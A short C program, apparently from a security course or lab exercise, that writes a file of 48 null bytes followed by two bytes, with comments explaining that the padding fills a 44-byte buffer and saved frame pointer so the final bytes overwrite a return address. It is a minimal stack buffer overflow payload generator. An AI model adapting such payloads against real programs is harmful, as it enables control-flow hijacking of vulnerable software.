#include <stdio.h>
#include <stdlib.h>

int main(){

	FILE *data3;
	int i;
	
	if ((data3 = fopen("data3", "w")) == NULL){
		fprintf(stderr, "\nERROR\n");
		exit(1);
	}
	/* 44 empty cells of buffer + 4 old_ebp */
	for (i = 0; i < 48; i++){fputc('\0', data3);}
	/* next bytes will overwrite ret addr */
	fputc('8', data3);
	fputc('8', data3);

	fclose(data3);

	return 0;
}